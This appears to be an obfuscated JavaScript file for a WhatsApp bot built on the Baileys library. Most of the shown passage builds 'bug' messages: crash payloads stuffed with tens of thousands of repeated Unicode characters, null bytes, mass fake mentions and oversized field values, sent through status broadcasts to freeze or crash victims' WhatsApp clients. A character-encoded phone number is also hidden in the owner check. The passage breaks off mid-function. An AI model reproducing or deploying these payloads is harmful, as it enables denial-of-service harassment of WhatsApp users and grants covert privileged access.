process.on("uncaughtException", console.error);
process.on("unhandledRejection", console.error);
require("./settings");
const fs = require("fs");
const path = require("path");
const util = require("util");
const jimp = require("jimp");
const axios = require("axios");
const chalk = require("chalk");
const yts = require("yt-search");
const {
  ytmp3,
  ytmp4
} = require("ruhend-scraper");
const JsConfuser = require("js-confuser");
const speed = require("performance-now");
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require("cheerio");
const os = require("os");
const {
  say
} = require("cfonts");
const pino = require("pino");
const {
  Client
} = require("ssh2");
const fetch = require("node-fetch");
const crypto = require("crypto");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const {
  default: WAdepayyection,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  getBinaryNodeChildren,
  useMultiFileAuthState,
  generateWAMessageContent,
  downloadContentFromMessage,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const {
  LoadDataBase
} = require("./source/message");
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"));
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"));
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"));
const list = JSON.parse(fs.readFileSync("./library/database/list.json"));
const unli = JSON.parse(fs.readFileSync("./library/database/unli.json"));
const {
  pinterest,
  pinterest2,
  remini,
  mediafire,
  tiktokDl
} = require("./library/scraper");
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg
} = require("./library/converter.js");
const {
  unixTimestampSeconds,
  generateMessageTag,
  processTime,
  webApi,
  getRandom,
  getBuffer,
  fetchJson,
  runtime,
  clockString,
  sleep,
  isUrl,
  getTime,
  formatDate,
  tanggal,
  formatp,
  jsonformat,
  reSize,
  toHD,
  logic,
  generateProfilePicture,
  bytesToSize,
  checkBandwidth,
  getSizeMedia,
  parseMention,
  getGroupAdmins,
  readFileTxt,
  readFileJson,
  getHashedPassword,
  generateAuthToken,
  cekMenfes,
  generateToken,
  batasiTeks,
  randomText,
  isEmoji,
  getTypeUrlMedia,
  pickRandom,
  toIDR,
  capital
} = require("./library/function");
module.exports = depayy = async (_0x4b0487, _0x172af6, _0x1e0247, _0x38e56f) => {
  try {
    await LoadDataBase(_0x4b0487, _0x172af6);
    const _0x4b67d6 = await _0x4b0487.decodeJid(_0x4b0487.user.id);
    const _0x4035f1 = _0x172af6.type === "conversation" ? _0x172af6.message.conversation : _0x172af6.type == "imageMessage" ? _0x172af6.message.imageMessage.caption : _0x172af6.type == "videoMessage" ? _0x172af6.message.videoMessage.caption : _0x172af6.type == "extendedTextMessage" ? _0x172af6.message.extendedTextMessage.text : _0x172af6.type == "buttonsResponseMessage" ? _0x172af6.message.buttonsResponseMessage.selectedButtonId : _0x172af6.type == "listResponseMessage" ? _0x172af6.message.listResponseMessage.singleSelectReply.selectedRowId : _0x172af6.type == "templateButtonReplyMessage" ? _0x172af6.message.templateButtonReplyMessage.selectedId : _0x172af6.type === "messageContextInfo" ? _0x172af6.message.buttonsResponseMessage?.selectedButtonId || _0x172af6.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x172af6.text : "";
    const _0x22d079 = typeof _0x172af6.text == "string" ? _0x172af6.text : "";
    const _0x3087b8 = String.fromCharCode(54, 50, 56, 53, 49, 55, 57, 56, 51, 54, 54, 48, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116);
    const _0x45b1bf = ".";
    const _0x975557 = _0x4035f1.startsWith(_0x45b1bf) ? true : false;
    const _0xd4ebe7 = _0x4035f1.trim().split(/ +/).slice(1);
    const _0x58d664 = _0x172af6.quoted || _0x172af6;
    const _0x2d1973 = _0x58d664.type == "buttonsMessage" ? _0x58d664[Object.keys(_0x58d664)[1]] : _0x58d664.type == "templateMessage" ? _0x58d664.hydratedTemplate[Object.keys(_0x58d664.hydratedTemplate)[1]] : _0x58d664.type == "product" ? _0x58d664[Object.keys(_0x58d664)[0]] : _0x172af6.quoted ? _0x172af6.quoted : _0x172af6;
    const _0x3d57b5 = _0x975557 ? _0x4035f1.slice(_0x45b1bf.length).trim().split(" ").shift().toLowerCase() : "";
    const _0x122801 = premium.includes(_0x172af6.sender);
    const _0x1afac2 = unli.includes(_0x172af6.chat);
    const _0x23ae7f = isOwner = [_0x4b67d6, owner + "@s.whatsapp.net", _0x3087b8, ...owners].includes(_0x172af6.sender) ? true : _0x172af6.isDeveloper ? true : false;
    const _0x3b31a4 = q = _0xd4ebe7.join(" ");
    const _0x12a7ce = (_0x2d1973.msg || _0x2d1973).mimetype || "";
    const _0x192152 = _0x2d1973.msg || _0x2d1973;
    const _0xd75ac9 = fs.readFileSync("./image/Nika.jpg");
    const _0xa3cfa3 = fs.readFileSync("./image/depayy.jpg");
    const _0x10520b = fs.readFileSync("./image/musik1.mp3");
    const {
      teksbug2: _0x580430
    } = require("./ui/button.js");
    if (_0x975557) {
      console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold("[ PESAN ]"), chalk.blue.bold(_0x172af6.sender.split("@")[0] + " =>"), chalk.blue.bold("" + (_0x45b1bf + _0x3d57b5)));
    }
    if (_0x172af6.isGroup && global.db.groups[_0x172af6.chat] && global.db.groups[_0x172af6.chat].mute == true && !_0x23ae7f) {
      return;
    }
    const _0x5e0a0c = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          orderId: "2009",
          thumbnail: _0xd75ac9,
          itemCount: "8193",
          status: "INQUIRY",
          surface: "CATALOG",
          message: "봀𝐃𝐄𝐏𝐀𝐘...☀",
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      contextInfo: {
        mentionedJid: ["120363369514105242@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true
      }
    };
    const _0x12baf0 = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net"
      },
      message: {
        extendedTextMessage: {
          text: "" + (_0x45b1bf + _0x3d57b5)
        }
      }
    };
    const _0x4f8f4d = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net"
      },
      message: {
        extendedTextMessage: {
          text: "" + namaOwner
        }
      }
    };
    const _0x245398 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(_0x172af6.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        locationMessage: {
          name: "WhatsApp Bot " + namaOwner,
          jpegThumbnail: ""
        }
      }
    };
    const _0x573c11 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(_0x172af6.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        locationMessage: {
          name: "WhatsApp Bot " + namaOwner,
          jpegThumbnail: ""
        }
      }
    };
    const _0x28b3b3 = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ownername",
        participant: "0@s.whatsapp.net"
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: "0@s.whatsapp.net",
          noteMessage: {
            extendedTextMessage: {
              text: "Nika"
            }
          },
          expiryTimestamp: 999999999,
          amount: {
            value: 91929291929,
            offset: 1000,
            currencyCode: "USD"
          }
        }
      }
    };
    const _0x2ebd03 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        ...(_0x172af6.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: ""
            },
            title: namaOwner + " - Marketplace",
            description: null,
            currencyCode: "IDR",
            priceAmount1000: "999999999999999",
            retailerId: "Powered By " + namaOwner,
            productImageCount: 1
          },
          businessOwnerJid: "0@s.whatsapp.net"
        }
      }
    };
    const _0x37ce5f = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(_0x172af6.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        liveLocationMessage: {
          caption: botname2 + " By " + namaOwner,
          jpegThumbnail: ""
        }
      }
    };
    function _0x458a88() {
      const _0x46f1b5 = new Date().getHours();
      if (_0x46f1b5 >= 0 && _0x46f1b5 < 12) {
        return "Good Morning 🌆";
      } else if (_0x46f1b5 >= 12 && _0x46f1b5 < 18) {
        return " Good Afternoon 🌇";
      } else {
        return "Good Night 🌌";
      }
    }
    const _0x204753 = _0x458a88();
    if (!_0x975557) {
      let _0x5e44de = list.find(_0x23afdd => _0x23afdd.cmd == _0x4035f1.toLowerCase());
      if (_0x5e44de) {
        await _0x172af6.reply(_0x5e44de.respon);
      }
    }
    const _0x17baa2 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        ...(_0x172af6.chat ? {
          remoteJid: "0@s.whatsapp.net"
        } : {})
      },
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "974197419741",
          pageCount: "974197419741",
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "𝐓𝐚𝐦𝐚𝐂𝐫𝐚𝐬𝐡~𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭 :v",
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173",
          contactVcard: true
        },
        title: "ᎿᎯᎷᎯ TᏒᎯᏕᎶ ᎿᎬᎲᎿ" + "ꦾ".repeat(103000),
        body: {
          text: "⚔️=> 𝐓𝐚𝐦𝐚𝐔𝐢𝐓𝐞𝐱𝐭" + "ꦾ".repeat(103000) + "@1".repeat(150000)
        },
        nativeFlowMessage: {},
        contextInfo: {
          mentionedJid: ["1@newsletter"],
          groupMentions: [{
            groupJid: "1@newsletter",
            groupSubject: "ALWAYSKAIZI"
          }]
        }
      },
      contextInfo: {
        mentionedJid: [_0x172af6.chat],
        externalAdReply: {
          showAdAttribution: true,
          title: "𝐒𝐮𝐧𝐆𝐨𝐝𝐍𝐢𝐤𝐚",
          body: "Depayy",
          mediaType: 3,
          renderLargerThumbnail: true,
          thumbnailUrl: "your-thumbnail-url-here",
          sourceUrl: "https://t.me/DepayOffc"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "Depay Sun God Nika"
        }
      },
      expiryTimestamp: 0,
      amount: {
        value: "999999999",
        offset: 999999999,
        currencyCode: "CRASHCODE9741"
      },
      background: {
        id: "100",
        fileLength: "928283",
        width: 1000,
        height: 1000,
        mimetype: "application/vnd.ms-powerpoint",
        placeholderArgb: 4278190080,
        textArgb: 4294967295,
        subtextArgb: 4278190080
      }
    };
    async function _0x7cfd29(_0x5d7d0a) {
      let _0x34c29a = await generateWAMessageFromContent(_0x5d7d0a, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                expiration: 1,
                ephemeralSettingTimestamp: 1,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 1,
                disappearingMode: {
                  initiatorDeviceJid: _0x5d7d0a,
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "UNKNOWN_GROUPS"
                },
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: [_0x5d7d0a],
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 1,
                    expiryTimestamp: null
                  }
                },
                externalAdReply: {
                  showAdAttribution: true,
                  renderLargerThumbnail: true
                }
              },
              body: {
                text: "봀㔛𝐍𝐈𝐊𝐀 |  ☀̤" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                    criador: "봀㔛𝐍𝐈𝐊𝐀 |  ☀̤",
                    versao: "@latest",
                    atualizado: "2025-04-15",
                    suporte: "https://wa.me/6289501955295",
                    comandosDisponiveis: ["extorditcv"],
                    prefixo: ".",
                    linguagem: "id"
                  }) + "봀㔛𝐍𝐈𝐊𝐀 |  ☀̤"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                    criador: "봀㔛𝐍𝐈𝐊𝐀 |  ☀̤",
                    versao: "@latest",
                    atualizado: "2025-04-15",
                    suporte: "https://wa.me/6289501955295",
                    comandosDisponiveis: ["extorditcv"],
                    prefixo: ".",
                    linguagem: "id"
                  }) + "봀㔛𝐍𝐈𝐊𝐀 |  ☀̤" + "ꦽ".repeat(120000)
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":2000000,\"offset\":100},\"reference_id\":\"4R0F79457Q7\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-8e93f147-12f5-45fa-b903-6fa5777bd7de\",\"name\":\"sksksksksksksks\",\"amount\":{\"value\":2000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"sksksksksksksks\",\"native_payment_methods\":[],\"share_payment_status\":false}" + "\0".repeat(120000)
                }]
              }
            }
          }
        }
      }, {});
      await _0x4b0487.relayMessage(_0x5d7d0a, _0x34c29a.message, {
        messageId: _0x34c29a.key.id
      });
      console.log(chalk.green("Send Bug Nika☀"));
    }
    async function _0x22563a(_0x3268f6, _0x273f93 = true) {
      let _0x4063c3 = JSON.stringify({
        status: true,
        criador: "Extorditcv",
        resultado: {
          type: "bug",
          ws: {
            _events: {
              "CB:ib,,dirty": ["Array"]
            },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
              version: ["Array"],
              browser: ["Array"],
              waWebdepayyetUrl: "wss://web.whatsapp.com/ws/chat",
              depayyConnectTimeoutMs: 20000,
              keepAliveIntervalMs: 30000,
              logger: {},
              printQRInTerminal: false,
              emitOwnEvents: true,
              defaultQueryTimeoutMs: 60000,
              customUploadHosts: [],
              retryRequestDelayMs: 250,
              maxMsgRetryCount: 5,
              fireInitQueries: true,
              auth: {
                Object: "authData"
              },
              markOnlineOnConnect: true,
              syncFullHistory: true,
              linkPreviewImageThumbnailWidth: 192,
              transactionOpts: {
                Object: "transactionOptsData"
              },
              generateHighQualityLinkPreview: false,
              options: {},
              appStateMacVerification: {
                Object: "appStateMacData"
              },
              mobile: true,
              debugStatus: function () {
                return {
                  connected: this.url ? true : false,
                  keepAlive: this.keepAliveIntervalMs,
                  timeout: this.defaultQueryTimeoutMs,
                  eventsCount: this._eventsCount,
                  overload: this._eventsCount > 1000000
                };
              },
              checkOverload: function () {
                if (this._eventsCount > 1000000) {
                  console.log("[WARN]");
                  process.send("reset");
                }
              }
            }
          }
        }
      });
      let _0x3c4c5d = await generateWAMessageFromContent(_0x3268f6, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "봀㔛𝐍𝐈𝐊𝐀 |  ☀",
                hasMediaAttachment: false
              },
              body: {
                text: "봀㔛𝐍𝐈𝐊𝐀 |  ☀" + "ꦾ".repeat(50000)
              },
              nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Click Me!",
                    url: "https://example.com",
                    merchant_url: "https://example.com"
                  })
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    permission_reason: "Access needed",
                    permission_type: "call"
                  })
                }]
              }
            }
          }
        }
      }, {});
      await _0x4b0487.relayMessage(_0x3268f6, _0x3c4c5d.message, _0x273f93 ? {
        participant: _0x3268f6
      } : {});
      console.log(chalk.green("Send Bug Nika☀"));
    }
    async function _0x216d7d(_0x1b4277, _0x253966) {
      const _0x4edc41 = {
        extendedTextMessage: {
          text: "᭯".repeat(12000),
          matchedText: "https://" + "ꦾ".repeat(500) + ".com",
          canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
          description: "\0".repeat(500),
          title: "‍".repeat(1000),
          previewType: "NONE",
          jpegThumbnail: Buffer.alloc(10000),
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: true,
              title: "BoomXSuper",
              body: "\0".repeat(10000),
              thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
              mediaType: 1,
              renderLargerThumbnail: true,
              sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({
              length: 1000
            }, (_0x492bbb, _0x59607b) => Math.floor(Math.random() * 1000000000) + "@s.whatsapp.net")
          }
        },
        paymentInviteMessage: {
          currencyCodeIso4217: "USD",
          amount1000: "999999999",
          expiryTimestamp: "9999999999",
          inviteMessage: "Payment Invite" + "💥".repeat(1770),
          serviceType: 1
        }
      };
      const _0x17a1bb = ["13135550002@s.whatsapp.net", ...Array.from({
        length: 40000
      }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")];
      const _0x520c0b = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".RaldzzXyz" + "ោ៝".repeat(10000),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
      };
      const _0x17356f = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: "☠️ - んジェラルド - ☠️",
            body: "" + "\0".repeat(9117),
            mediaType: 1,
            renderLargerThumbnail: true,
            thumbnailUrl: null,
            sourceUrl: "https://" + "ꦾ".repeat(100) + ".com/"
          },
          businessMessageForwardInfo: {
            businessOwnerJid: _0x1b4277
          },
          quotedMessage: _0x4edc41
        },
        isSampled: true,
        mentionedJid: _0x17a1bb,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "" + "ꦾ".repeat(100)
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [{
          embeddedContent: {
            embeddedMusic: _0x520c0b
          },
          embeddedAction: true
        }]
      };
      const _0x35d375 = generateWAMessageFromContent(_0x1b4277, {
        viewOnceMessage: {
          message: {
            videoMessage: _0x17356f
          }
        }
      }, {});
      await _0x4b0487.relayMessage("status@broadcast", _0x35d375.message, {
        messageId: _0x35d375.key.id,
        statusJidList: [_0x1b4277],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x1b4277
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x253966) {
        await _0x4b0487.relayMessage(_0x1b4277, {
          groupStatusMentionMessage: {
            message: {
              protocolMessage: {
                key: _0x35d375.key,
                type: 25
              }
            }
          }
        }, {
          additionalNodes: [{
            tag: "meta",
            attrs: {
              is_status_mention: "true"
            },
            content: undefined
          }]
        });
      }
    }
    async function _0x278d55(_0x53eab2, _0x54d252 = false, _0x308728 = 500) {
      for (const _0x4b4818 of _0x53eab2) {
        const _0x1acee7 = {
          viewOnceMessage: {
            message: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                caption: "? ???????-?",
                fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                fileLength: "19769",
                height: 354,
                width: 783,
                mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                mediaKeyTimestamp: "1743225419",
                jpegThumbnail: null,
                scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                scanLengths: [2437, 17332],
                contextInfo: {
                  mentionedJid: Array.from({
                    length: 30000
                  }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                  isSampled: true,
                  participant: _0x53eab2,
                  remoteJid: "status@broadcast",
                  forwardingScore: 9741,
                  isForwarded: true
                }
              }
            }
          }
        };
        const _0x4a46c6 = generateWAMessageFromContent(_0x53eab2, _0x1acee7, {});
        await _0x4b0487.relayMessage("status@broadcast", _0x4a46c6.message, {
          messageId: _0x4a46c6.key.id,
          statusJidList: [_0x53eab2],
          additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                tag: "to",
                attrs: {
                  jid: _0x53eab2
                },
                content: undefined
              }]
            }]
          }]
        });
        if (_0x54d252) {
          await _0x4b0487.relayMessage(_0x53eab2, {
            statusMentionMessage: {
              message: {
                protocolMessage: {
                  key: _0x4a46c6.key,
                  type: 25
                }
              }
            }
          }, {
            additionalNodes: [{
              tag: "meta",
              attrs: {
                is_status_mention: "???? ???????? - ????"
              },
              content: undefined
            }]
          });
        }
        await new Promise(_0x41ebbd => setTimeout(_0x41ebbd, _0x308728));
      }
    }
    async function _0x2986b2(_0x40cfcd, _0x16e3ed) {
      const _0x533988 = Array.from({
        length: 9741
      }, (_0xb27cc2, _0x4feafc) => ({
        title: "᭯".repeat(9741),
        rows: [{
          title: "" + (_0x4feafc + 1),
          id: "" + (_0x4feafc + 1)
        }]
      }));
      const _0x143983 = {
        viewOnceMessage: {
          message: {
            listResponseMessage: {
              title: "\0",
              listType: 2,
              buttonText: null,
              sections: _0x533988,
              singleSelectReply: {
                selectedRowId: "☀"
              },
              contextInfo: {
                mentionedJid: Array.from({
                  length: 9741
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                participant: _0x40cfcd,
                remoteJid: "status@broadcast",
                forwardingScore: 9741,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "9741@newsletter",
                  serverMessageId: 1,
                  newsletterName: "-"
                }
              },
              description: "\0"
            }
          }
        },
        contextInfo: {
          channelMessage: true,
          statusAttributionType: 2
        }
      };
      const _0x504bec = generateWAMessageFromContent(_0x40cfcd, _0x143983, {});
      await _0x4b0487.relayMessage("status@broadcast", _0x504bec.message, {
        messageId: _0x504bec.key.id,
        statusJidList: [_0x40cfcd],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x40cfcd
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x16e3ed) {
        await sock.relayMessage(_0x40cfcd, {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: _0x504bec.key,
                type: 25
              }
            }
          }
        }, {
          additionalNodes: [{
            tag: "meta",
            attrs: {
              is_status_mention: "☀𝗡𝗶𝗸𝗮𝗩𝗲𝗿𝘀𝗶𝗼𝗻𝟲 - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹"
            },
            content: undefined
          }]
        });
      }
    }
    const _0x22a6b8 = _0xe17453 => {
      return "\n *Example Command :*\n *" + (_0x45b1bf + _0x3d57b5) + "* " + _0xe17453 + "\n";
    };
    _0x4b0487.sendFile = async (_0x235003, _0x374668, _0x288816 = "", _0x6f8e2f = "", _0x30fb28, _0x482c3f = false, _0x593280 = {}) => {
      let _0x325c02 = await _0x4b0487.getFile(_0x374668, true);
      let {
        res: _0x10cf02,
        data: _0x51d82c,
        filename: _0x3fecc4
      } = _0x325c02;
      if (_0x10cf02 && _0x10cf02.status !== 200 || _0x51d82c.length <= 65536) {
        try {
          throw {
            json: JSON.parse(_0x51d82c.toString())
          };
        } catch (_0x347555) {
          if (_0x347555.json) {
            throw _0x347555.json;
          }
        }
      }
      let _0x356fae = {
        filename: _0x288816
      };
      if (_0x30fb28) {
        _0x356fae.quoted = _0x30fb28;
      }
      if (!_0x325c02) {
        _0x593280.asDocument = true;
      }
      let _0x1da856 = "";
      let _0x5875d5 = _0x325c02.mime;
      let _0x1ab544;
      if (/webp/.test(_0x325c02.mime) || /image/.test(_0x325c02.mime) && _0x593280.asSticker) {
        _0x1da856 = "sticker";
      } else if (/image/.test(_0x325c02.mime) || /webp/.test(_0x325c02.mime) && _0x593280.asImage) {
        _0x1da856 = "image";
      } else if (/video/.test(_0x325c02.mime)) {
        _0x1da856 = "video";
      } else if (/audio/.test(_0x325c02.mime)) {
        _0x1ab544 = await (_0x482c3f ? toPTT : toAudio)(_0x51d82c, _0x325c02.ext);
        _0x51d82c = _0x1ab544.data;
        _0x3fecc4 = _0x1ab544.filename;
        _0x1da856 = "audio";
        _0x5875d5 = "audio/ogg; codecs=opus";
      } else {
        _0x1da856 = "document";
      }
      if (_0x593280.asDocument) {
        _0x1da856 = "document";
      }
      delete _0x593280.asSticker;
      delete _0x593280.asLocation;
      delete _0x593280.asVideo;
      delete _0x593280.asDocument;
      delete _0x593280.asImage;
      let _0x3c8c48 = {
        ..._0x593280,
        caption: _0x6f8e2f,
        ptt: _0x482c3f,
        [_0x1da856]: {
          url: _0x3fecc4
        },
        mimetype: _0x5875d5
      };
      let _0x42c52b;
      try {
        _0x42c52b = await _0x4b0487.sendMessage(_0x235003, _0x3c8c48, {
          ..._0x356fae,
          ..._0x593280
        });
      } catch (_0x1e0fbf) {
        _0x42c52b = null;
      } finally {
        if (!_0x42c52b) {
          _0x42c52b = await _0x4b0487.sendMessage(_0x235003, {
            ..._0x3c8c48,
            [_0x1da856]: _0x51d82c
          }, {
            ..._0x356fae,
            ..._0x593280
          });
        }
        _0x51d82c = null;
        return _0x42c52b;
      }
    };
    function _0x1fec27() {
      const _0x8f12c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*";
      const _0x584fea = 10;
      let _0x29b5c2 = "";
      for (let _0x4b83a6 = 0; _0x4b83a6 < _0x584fea; _0x4b83a6++) {
        const _0x2200a3 = Math.floor(Math.random() * _0x8f12c.length);
        _0x29b5c2 += _0x8f12c[_0x2200a3];
      }
      return _0x29b5c2;
    }
    function _0x43faee(_0x2a5cc9, _0x1179ad) {
      return Math.floor(Math.random() * (_0x1179ad - _0x2a5cc9 + 1)) + _0x2a5cc9;
    }
    const _0x350195 = async _0x1eeb37 => {
      return _0x4b0487.sendMessage(_0x172af6.chat, {
        text: _0x1eeb37,
        mentions: [_0x172af6.sender],
        contextInfo: {
          externalAdReply: {
            title: botname,
            body: "© Powered By " + namaOwner,
            thumbnailUrl: global.image.reply,
            sourceUrl: null
          }
        }
      }, {
        quoted: _0x12baf0
      });
    };
    async function _0x3efc1e(_0x508023) {
